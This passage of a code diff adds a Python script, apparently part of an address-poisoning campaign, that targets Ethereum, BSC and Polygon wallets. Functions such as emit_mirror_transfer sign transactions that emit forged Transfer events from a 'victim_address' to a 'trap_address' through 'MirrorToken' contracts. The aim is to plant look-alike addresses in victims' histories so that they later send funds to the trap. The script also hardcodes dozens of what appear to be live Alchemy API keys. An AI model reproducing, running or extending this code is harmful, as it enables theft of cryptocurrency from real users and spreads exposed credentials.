+    try:
+        import httpx
+        timeout_config = httpx.Timeout(60.0, connect=10.0)
+        if hasattr(supabase, '_client') and hasattr(supabase._client, 'timeout'):
+            supabase._client.timeout = timeout_config
+    except Exception:
+        pass # Silently ignore if httpx isn't available or structure changed
+    print("[DEBUG] Supabase client initialized successfully")
+
+# ─── Read preferred asset from environment (set by re_poison.js) ───
+PREFERRED_ASSET = os.getenv("DUST_ASSET")
+if PREFERRED_ASSET:
+    print(f'[DEBUG] PREFERRED_ASSET from env: {PREFERRED_ASSET}')
+else:
+    print('[DEBUG] No PREFERRED_ASSET set, will use default fallback')
+
+def update_job(job_id, status=None, progress=None, total=None, message=None):
+    """Update job status in Supabase with proper ISO timestamps."""
+    if not supabase or not job_id:
+        return
+    data = {}
+    if status is not None:
+        data["status"] = status
+    if progress is not None:
+        data["progress"] = progress
+    if total is not None:
+        data["total"] = total
+    if message is not None:
+        data["message"] = message
+        
+    iso_now = datetime.now(timezone.utc).isoformat()
+    if status == "running" and "started_at" not in data:
+        data["started_at"] = iso_now
+    if status in ("completed", "failed"):
+        data["completed_at"] = iso_now
+
+    if not data:
+        return
+
+    try:
+        supabase.table("jobs").update(data).eq("id", job_id).execute()
+    except Exception as e:
+        logger.error(f"Failed to update job {job_id}: {e}")
+
+def get_campaign_id_from_job(job_id):
+    """Retrieve campaign_id from job record."""
+    if not supabase:
+        return None
+    try:
+        result = supabase.table("jobs").select("campaign_id").eq("id", job_id).execute()
+        if result.data:
+            return result.data[0]["campaign_id"]
+    except Exception as e:
+        logger.error(f"Failed to get campaign_id for job {job_id}: {e}")
+    return None
+
+print('[DEBUG] Starting duster.py...')
+
+# --- MULTI‑CHAIN: STRICT PM2 Env Var Prioritization ---
+CHAIN = os.getenv('CHAIN') or getattr(config, 'CHAIN', 'ethereum')
+chain_cfg = config.get_chain_config() if hasattr(config, 'get_chain_config') else None
+
+if chain_cfg and 'tokens' in chain_cfg:
+    TOKEN_CONFIG = chain_cfg['tokens']
+else:
+    TOKEN_CONFIG = config.TOKEN_CONFIG
+
+if chain_cfg and 'dust' in chain_cfg:
+    DUST_AMOUNT = chain_cfg['dust']
+else:
+    DUST_AMOUNT = config.DUST_AMOUNT
+
+NATIVE_SYMBOL = chain_cfg['native_symbol'] if chain_cfg and 'native_symbol' in chain_cfg else 'ETH'
+
+if hasattr(config, 'get_chain_rpc'):
+    RPC_URL = config.get_chain_rpc()
+else:
+    RPC_URL = config.DUSTER_RPC_URL
+
+if RPC_URL is None or RPC_URL == "":
+    RPC_URL = os.getenv("DUSTER_RPC_URL") or os.getenv("NODE_RPC_URL")
+
+print(f'[DEBUG] Chain: {CHAIN}, Native symbol: {NATIVE_SYMBOL}')
+print('[DEBUG] DUST_AMOUNT:', DUST_AMOUNT)
+print('[DEBUG] TOKEN_CONFIG:', TOKEN_CONFIG)
+print(f'[DEBUG] Using RPC: {RPC_URL}')
+
+# --- Custom HTTPProvider that truncates extraData for POA chains ---
+class POAHTTPProvider(Web3.HTTPProvider):
+    def make_request(self, method, params):
+        response = super().make_request(method, params)
+        if method in ('eth_getBlockByNumber', 'eth_getBlockByHash'):
+            if 'result' in response and 'extraData' in response['result']:
+                extra = response['result']['extraData']
+                if isinstance(extra, str):
+                    extra_bytes = bytes.fromhex(extra[2:] if extra.startswith('0x') else extra)
+                else:
+                    extra_bytes = extra
+                if len(extra_bytes) > 32:
+                    response['result']['extraData'] = '0x' + extra_bytes[:32].hex()
+        return response
+
+# Handle POA middleware import across different web3.py versions
+try:
+    from web3.middleware import geth_poa_middleware
+except ImportError:
+    try:
+        from web3.middleware import ExtraDataToPOAMiddleware as geth_poa_middleware
+    except ImportError:
+        geth_poa_middleware = None
+
+
+# ─── Public RPC fallbacks (Verified High-Availability Nodes) ───
+PUBLIC_RPC_FALLBACKS = {
+    'bsc': [
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
+    'https://bsc-dataseed.binance.org',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
+    'https://rpc.ankr.com/bsc',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
+    'https://bsc.publicnode.com',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
+    'https://1rpc.io/bnb',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
+    'https://bsc.drpc.org',
+    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
+  ],
+  'polygon': [
+    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
+    'https://polygon-rpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
+    'https://rpc.ankr.com/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
+    'https://polygon.llamarpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
+    'https://polygon.publicnode.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
+    'https://1rpc.io/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
+  ],
+  'ethereum': [
+    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
+    'https://ethereum.publicnode.com',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
+    'https://rpc.ankr.com/eth',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
+    'https://eth.llamarpc.com',
+    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
+    'https://1rpc.io/eth',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
+    'https://eth.drpc.org',
+    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
+    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
+  ],
+}
+
+# ─── Alchemy RPCs for deep history fetching ───
+ALCHEMY_RPCS = {
+    'bsc': [
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_DMA2jJjcrOWJ9R10_Fx5k',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_bBpETSAAmA8VjshNMBkLn',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_VJ0_4LOGnzlbo7NPkqhg-',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
+         'https://bnb-mainnet.g.alchemy.com/v2/alch_3_Bpj7ORVica5UbSitOXm',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_AMGRdQ1DjpCspfYgaJWk8',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_n0iXFk0U2atdbZFyJw3Vd',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_uG-HMTi_h9uFfpZ0IPtUC',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_Of_5h7lrnjaNskMMN1m_O',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_JXJn_G0u41v-ORLH-PLvm',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_6DY1YYDbhjfaDTRvVlb8E',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_FY7h0VVmtvSHzWHULlBYD',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_e2hNo6urdy-p9K3iCKBRz',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_wT_5s_3jEKZRUHS6-9qlB',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_xo7rkNtpCG3XTTte_34Oe',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
+        'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh',
+    ],
+    'polygon': [
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_qfGoxus-szPvLI44z9YWw',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_fcNea90VExKd5DNvSguRa',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_sr3YXfVMNVZJ5qSCU0kyD',
+         'https://polygon-mainnet.g.alchemy.com/v2/alch_6bgVHMAQFQbOqC7cHZ5tU',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_e1PIp-UVXQ1jZWINkbmDm',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_n9bFKwbW1lFSXd-CTjFA8',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_VXeIGTUmcC8G4X4a4Lx8e',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_adXxpjamb8lNBSSnH-dZF',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_vUHRCAI2B5z-NVbge5MjR',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_YXuYd2T6nO-_ASx3VyYd8',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_o4lfkzzsAyG0uEFq9cfx0',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_6vT8KHKebKLX2IzQCgHpo',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_C7D8h3Jq99k3QweZHq1Ip',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_1t_00WgSdtEqIYYRY8LdA',
+        'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
+        'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11',
+    ],
+    'ethereum': [
+        'https://eth-mainnet.g.alchemy.com/v2/alch_0hEit_izstW7cL9Gyz_T_',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_A0-PobPGMyEAZ31xva35A',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_D_FWof7AulPvkFHZnDlFn',
+         'https://eth-mainnet.g.alchemy.com/v2/alch_3smRQUoTzfj_NPiK6451s',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_xp0ppatuXONHI2pClS7_M',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_hmts-IFXko93muF8BaX5Q',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_8fJp6NiVdGxCOljdKCDZi',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_4euFfPOpJDglYNRQYKWhO',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_bjwK80RPIzP774OVkp-vE',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_LcoDsDwyyl7fbYUvffKYC',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_btTtYZmxG7VfNjY_jZIJr',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_IP1SsCj0wqzZqrvhH_Rv5',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_1O0yoHMsrXCOe3lOHu7dc',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_w2NDE7Pilr5cpIPb51Wsx',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
+        'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
+        'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
+        'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et',
+    ],
+}
+
+
+# ─── Mirror Token Contracts ───
+# Stablecoins
+MIRROR_TOKEN_USDC = os.getenv("MIRROR_TOKEN_USDC")
+MIRROR_TOKEN_USDT = os.getenv("MIRROR_TOKEN_USDT")
+MIRROR_TOKEN_DAI = os.getenv("MIRROR_TOKEN_DAI")
+MIRROR_TOKEN_EURC = os.getenv("MIRROR_TOKEN_EURC")
+MIRROR_TOKEN_EURCV = os.getenv("MIRROR_TOKEN_EURCV")
+
+# Wrapped tokens
+MIRROR_TOKEN_WBTC = os.getenv("MIRROR_TOKEN_WBTC")
+MIRROR_TOKEN_cbETH = os.getenv("MIRROR_TOKEN_cbETH")
+MIRROR_TOKEN_WETH = os.getenv("MIRROR_TOKEN_WETH")
+
+# DeFi tokens
+MIRROR_TOKEN_LINK = os.getenv("MIRROR_TOKEN_LINK")
+MIRROR_TOKEN_AAVE = os.getenv("MIRROR_TOKEN_AAVE")
+MIRROR_TOKEN_ENA = os.getenv("MIRROR_TOKEN_ENA")
+MIRROR_TOKEN_CHEX = os.getenv("MIRROR_TOKEN_CHEX")
+
+# Meme coins
+MIRROR_TOKEN_SHIB = os.getenv("MIRROR_TOKEN_SHIB")
+MIRROR_TOKEN_PEPE = os.getenv("MIRROR_TOKEN_PEPE")
+MIRROR_TOKEN_DOGE = os.getenv("MIRROR_TOKEN_DOGE")
+MIRROR_TOKEN_BONK = os.getenv("MIRROR_TOKEN_BONK")
+
+# Other tokens
+MIRROR_TOKEN_WLFI = os.getenv("MIRROR_TOKEN_WLFI")
+MIRROR_TOKEN_HEX = os.getenv("MIRROR_TOKEN_HEX")
+MIRROR_TOKEN_CRCLon = os.getenv("MIRROR_TOKEN_CRCLon")
+
+# Native coins
+MIRROR_TOKEN_NATIVE = os.getenv("MIRROR_TOKEN_NATIVE")
+
+MIRROR_CONTRACTS = {
+    # Stablecoins
+    "USDC": MIRROR_TOKEN_USDC,
+    "USDT": MIRROR_TOKEN_USDT,
+    "DAI": MIRROR_TOKEN_DAI,
+    "EURC": MIRROR_TOKEN_EURC,
+    "EURCV": MIRROR_TOKEN_EURCV,
+    
+    # Wrapped tokens
+    "WBTC": MIRROR_TOKEN_WBTC,
+    "cbETH": MIRROR_TOKEN_cbETH,
+    "WETH": MIRROR_TOKEN_WETH,
+    
+    # DeFi tokens
+    "LINK": MIRROR_TOKEN_LINK,
+    "AAVE": MIRROR_TOKEN_AAVE,
+    "ENA": MIRROR_TOKEN_ENA,
+    "CHEX": MIRROR_TOKEN_CHEX,
+    
+    # Meme coins
+    "SHIB": MIRROR_TOKEN_SHIB,
+    "PEPE": MIRROR_TOKEN_PEPE,
+    "DOGE": MIRROR_TOKEN_DOGE,
+    "BONK": MIRROR_TOKEN_BONK,
+    
+    # Other tokens
+    "WLFI": MIRROR_TOKEN_WLFI,
+    "HEX": MIRROR_TOKEN_HEX,
+    "CRCLon": MIRROR_TOKEN_CRCLon,
+    
+    # Native coins (all use the same contract)
+    "ETH": MIRROR_TOKEN_NATIVE,
+    "BNB": MIRROR_TOKEN_NATIVE,
+    "MATIC": MIRROR_TOKEN_NATIVE,
+}
+
+MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"name":"batchEmitTransfers","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
+
+# ─── Multi-Token Router Configuration ───
+MULTI_TOKEN_ROUTER = os.getenv("MULTI_TOKEN_ROUTER")
+MULTI_TOKEN_ROUTER_ABI = json.loads('[{"inputs":[{"components":[{"internalType":"address","name":"target","type":"address"},{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"internalType":"struct MultiTokenBatchRouter.BatchCall[]","name":"calls","type":"tuple[]"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
+def get_token_decimals(asset_symbol):
+    """Get the correct number of decimals for a token symbol."""
+    decimals_map = {
+        # Native coins (18 decimals)
+        'ETH': 18,
+        'BNB': 18,
+        'MATIC': 18,
+        'WETH': 18,
+        'WBNB': 18,
+        'WMATIC': 18,
+        
+        # Stablecoins with 6 decimals
+        'USDC': 6,
+        'USDT': 6,
+        'EURC': 6,
+        'USDP': 6,
+        'BUSD': 6,
+        
+        # Stablecoins with 18 decimals
+        'DAI': 18,
+        'EURCV': 18,
+        'TUSD': 18,
+        'FRAX': 18,
+        
+        # Bitcoin variants (8 decimals)
+        'WBTC': 8,
+        'renBTC': 8,
+        
+        # DeFi tokens (18 decimals)
+        'LINK': 18,
+        'AAVE': 18,
+        'ENA': 18,
+        'CHEX': 18,
+        'cbETH': 18,
+        
+        # Meme coins
+        'SHIB': 18,
+        'PEPE': 18,
+        'DOGE': 18,
+        'BONK': 5,  # BONK uses 5 decimals
+        
+        # Other tokens
+        'WLFI': 18,
+        'HEX': 8,  # HEX uses 8 decimals
+        'CRCLon': 18,
+    }
+    
+    symbol = asset_symbol.upper()
+    decimals = decimals_map.get(symbol)
+    
+    if decimals is None:
+        logger.warning(f"Unknown token '{asset_symbol}', defaulting to 18 decimals")
+        return 18
+    
+    return decimals
+
+
+# Mirror uses the campaign funding wallet as operator (same as re_poison.js)
+def get_mirror_operator_key(campaign_id):
+    """Fetch and decrypt the funding key for mirror operations."""
+    if not supabase or not campaign_id:
+        return None
+    try:
+        result = supabase.table("campaigns").select("funding_private_key_enc").eq("id", campaign_id).execute()
+        if not result.data:
+            return None
+        enc_key = result.data[0].get("funding_private_key_enc")
+        if not enc_key:
+            return None
+        funding_key = decrypt(enc_key).strip()
+        if not funding_key.startswith('0x'):
+            funding_key = f'0x{funding_key}'
+        return funding_key
+    except Exception as e:
+        logger.error(f"Failed to get mirror operator key: {e}")
+        return None
+
+
+def send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context="Mirror"):
+    """Send a rate-limited Telegram alert for insufficient gas (once per hour per wallet)."""
+    now = time.time()
+    last_alert = _last_gas_insufficient_alert.get(operator_addr, 0)
+    if now - last_alert > 3600: # Rate limit: Once per hour
+        # Map chain to CoinGecko ID
+        coin_id = "ethereum"
+        if CHAIN.lower() == "bsc": coin_id = "binancecoin"
+        elif CHAIN.lower() == "polygon": coin_id = "matic-network"
+        
+        try:
+            price_data = json.loads(urllib.request.urlopen(
+                urllib.request.Request(
+                    f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd",
+                    headers={'User-Agent': 'CipherNet/1.0'}
+                ), timeout=3
+            ).read().decode())
+            native_price = price_data[coin_id]['usd']
+            needed_usd = float(needed_eth) * native_price
+            have_usd = float(have_eth) * native_price
+            fund_usd = max(10.0, float(shortfall) * native_price * 100)
+            fund_native = fund_usd / native_price
+            price_line = f" (~${needed_usd:.2f} needed, ~${have_usd:.4f} balance)"
+            fund_suggestion = f"{fund_native:.4f} {NATIVE_SYMBOL} (~${fund_usd:.2f})"
+        except Exception:
+            price_line = ""
+            fund_suggestion = f"0.01 {NATIVE_SYMBOL}"
+        
+        alert_msg = (
+            f"⛽ Insufficient Gas in Funding Wallet ({context})\n\n"
+            f"Your campaign funding wallet cannot emit batch events.\n\n"
+            f"🔑 Wallet: `{operator_addr}`\n"
+            f"📊 Needed: `{needed_eth:.8f} {NATIVE_SYMBOL}`{price_line}\n"
+            f"💰 Balance: `{have_eth:.8f} {NATIVE_SYMBOL}`\n"
+            f"📉 Shortfall: `{shortfall:.8f} {NATIVE_SYMBOL}`\n\n"
+            f"💡 Fund this wallet with at least **{fund_suggestion}** to continue operations."
+        )
+        send_telegram(alert_msg, campaign_id=campaign_id)
+        _last_gas_insufficient_alert[operator_addr] = now
+    
+
+def get_explorer_url(address, link_type='address'):
+    """Generate Etherscan/BscScan/PolygonScan URL."""
+    base_urls = {
+        'ethereum': 'https://etherscan.io',
+        'bsc': 'https://bscscan.com',
+        'polygon': 'https://polygonscan.com'
+    }
+    base_url = base_urls.get(CHAIN.lower(), 'https://etherscan.io')
+    
+    if link_type == 'tx':
+        return f"{base_url}/tx/{address}"
+    return f"{base_url}/address/{address}#tokentxns"
+
+
+def notify_gas_strategy(campaign_id, used_fallback, final_gwei):
+    """Send a Telegram notification about which gas strategy was used."""
+    try:
+        if used_fallback:
+            msg = (
+                f"⚠️ *Gas Strategy: Fallback Used*\n\n"
+                f"The network stayed congested for 90 minutes.\n\n"
+                f"⛽ *Firing at Market Rate:* `{final_gwei:.2f} Gwei`\n\n"
+                f"💡 _This ensures your nonces don't get stuck, but costs slightly more._"
+            )
+            send_telegram(msg, campaign_id=campaign_id)
+        else:
+            msg = (
+                f"✅ *Gas Strategy: Cheap Gas Sniped!*\n\n"
+                f"The network is currently uncongested.\n\n"
+                f"⛽ *Firing at Cheap Rate:* `{final_gwei:.2f} Gwei`\n\n"
+                f"💰 _Saving you money on this batch!_"
+            )
+            send_telegram(msg, campaign_id=campaign_id)
+    except Exception as e:
+        logger.warning(f"[gas-strategy] Failed to send gas notification: {e}")
+
+def check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, context):
+    """Checks if operator has enough balance for gas. Returns True if OK, False if insufficient."""
+    operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
+    gas_price = gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
+    gas_cost = estimated_gas * gas_price
+    
+    if operator_balance < gas_cost:
+        needed_eth = float(w3.from_wei(gas_cost, 'ether'))
+        have_eth = float(w3.from_wei(operator_balance, 'ether'))
+        shortfall = needed_eth - have_eth
+        logger.error(f"[{context}] Insufficient gas. Need {needed_eth}, have {have_eth}")
+        send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context=context)
+        return False
+    return True    
+
+
+def get_smart_gas_params(w3, context="[gas-strategy]", campaign_id=None):
+    """
+    Smart Gas Strategy: Wait for cheap gas (0.5 Gwei), but fallback to spot price 
+    if it takes longer than 10 minutes to prevent stuck nonces.
+    """
+    default_max_fee = w3.to_wei(2, 'gwei')
+    default_priority = w3.to_wei(0.01, 'gwei')
+    
+    target_max_fee = w3.to_wei(0.5, 'gwei')
+    network_tip = w3.to_wei(0.01, 'gwei')
+    
+    used_fallback = False
+    final_gwei = 0.0
+    
+    try:
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        base_fee = latest_block.get("baseFeePerGas", 0) or 0
+        base_fee_gwei = float(w3.from_wei(base_fee, 'gwei'))
+        target_gwei = float(w3.from_wei(target_max_fee, 'gwei'))
+        final_gwei = base_fee_gwei
+        
+        if base_fee <= target_max_fee:
+            final_max_fee = base_fee + network_tip
+            logger.info(f"{context} ✅ Base fee is cheap ({base_fee_gwei:.2f} Gwei). Firing immediately!")
+        else:
+            logger.info(f"{context} ⏳ Base fee is {base_fee_gwei:.2f} Gwei. Waiting up to 90 mins for it to drop to <{target_gwei} Gwei...")
+            
+            gas_dropped = False
+            for i in range(90): # 90 iterations * 60s = 90 mins (1.5 hours)
+                time.sleep(60)
+                
+                try:
+                    current_block = call_with_retry(w3.eth.get_block, "latest")
+                    current_base_fee = current_block.get("baseFeePerGas", 0) or 0
+                    current_gwei = float(w3.from_wei(current_base_fee, 'gwei'))
+                    final_gwei = current_gwei
+                    
+                    if current_base_fee <= target_max_fee:
+                        final_max_fee = current_base_fee + network_tip
+                        gas_dropped = True
+                        logger.info(f"{context} ✅ Base fee dropped to {current_gwei:.2f} Gwei! Firing at cheap rate!")
+                        break
+                    
+                    if i % 10 == 0:
+                        logger.info(f"{context} ⏳ Still waiting... Current base fee: {current_gwei:.2f} Gwei")
+                except Exception as e:
+                    logger.warning(f"{context} Failed to check base fee: {e}")
+                    break
+                    
+            if not gas_dropped:
+                used_fallback = True
+                try:
+                    fallback_block = call_with_retry(w3.eth.get_block, "latest")
+                    fallback_base_fee = fallback_block.get("baseFeePerGas", base_fee) or base_fee
+                    final_max_fee = fallback_base_fee + network_tip
+                    fallback_gwei = float(w3.from_wei(fallback_base_fee, 'gwei'))
+                    final_gwei = fallback_gwei
+                    logger.warning(f"{context} ⚠️ Gas stayed high for 90 mins. Firing at current market rate ({fallback_gwei:.2f} Gwei) to prevent stuck nonces.")
+                except Exception as e:
+                    final_max_fee = base_fee + network_tip
+                    logger.warning(f"{context} ⚠️ Gas check failed. Firing at original base fee.")
+                    
+        # 🚀 Send Telegram Notification
+        if campaign_id:
+            notify_gas_strategy(campaign_id, used_fallback, final_gwei)
+            
+        return {'maxFeePerGas': final_max_fee, 'maxPriorityFeePerGas': network_tip}
+        
+    except Exception as e:
+        logger.warning(f"{context} Failed to estimate fees, using defaults: {e}")
+        return {'maxFeePerGas': default_max_fee, 'maxPriorityFeePerGas': default_priority}
+
+
+def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaign_id):
+    """
+    Emit a forged Transfer event via MirrorToken contract.
+    Returns tx_hash on success, None on failure.
+    """
+        # Try exact match, then uppercase, then fallback to native ETH contract
+    contract_address = (
+        MIRROR_CONTRACTS.get(asset) or 
+        MIRROR_CONTRACTS.get(asset.upper()) or 
+        MIRROR_TOKEN_NATIVE  # 🆕 Fallback to native ETH stealth contract
+    )
+    if not contract_address:
+        logger.warning(f"[mirror] No MirrorToken contract configured for {asset} (no fallback available)")
+        return None
+    
+    # Log fallback usage for unknown tokens
+    is_fallback = (
+        contract_address == MIRROR_TOKEN_NATIVE and 
+        asset.upper() not in ('ETH', 'BNB', 'MATIC')
+    )
+    if is_fallback:
+        logger.info(f"[mirror] Using ETH fallback contract for unknown token: {asset}")
+
+    operator_key = get_mirror_operator_key(campaign_id)
+    if not operator_key:
+        logger.warning(f"[mirror] No funding key for campaign {campaign_id}, cannot emit mirror")
+        return None
+
+    try:
+        operator_account = w3.eth.account.from_key(operator_key)
+        operator_addr = operator_account.address
+
+        contract = w3.eth.contract(
+            address=w3.to_checksum_address(contract_address),
+            abi=MIRROR_ABI
+        )
+
+        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
+
+        # Use low gas - mirror only needs ~50k gas
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        use_eip1559 = (
+            "baseFeePerGas" in latest_block
+            and latest_block["baseFeePerGas"] is not None
+            and CHAIN.lower() != "bsc"
+        )
+
+        gas_params = {}
+        if use_eip1559:
+            gas_params = get_smart_gas_params(w3, context="[mirror]", campaign_id=campaign_id)
+        else:
+            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
+
+        estimated_gas = 80000 # 🚀 Increased buffer to match re_poison.js
+
+        tx = contract.functions.transferFrom(
+            w3.to_checksum_address(victim_address),
+            w3.to_checksum_address(trap_address),
+            raw_value
+        ).build_transaction({
+            'from': operator_addr,
+            'nonce': nonce,
+            'gas': estimated_gas,
+            'chainId': w3.eth.chain_id,
+            **gas_params
+        })
+
+        # 🚀 DRY Refactor: Use shared balance checker
+        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "mirror"):
+            return None
+        signed = w3.eth.account.sign_transaction(tx, operator_key)
+        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        logger.info(f"[mirror] Forged Transfer emitted: {victim_address} → {trap_address} raw={raw_value} {asset} tx={tx_hash.hex()}")
+
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
+        if receipt.status == 1:
+            logger.info(f"[mirror] ✅ Mirror tx confirmed in block {receipt.blockNumber}")
+            return tx_hash.hex()
+        else:
+            logger.error(f"[mirror] ❌ Mirror tx reverted")
+            return None
+
+    except Exception as e:
+        logger.error(f"[mirror] Failed to emit forged transfer: {e}")
+        return None
+
+
+
+def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
+    """
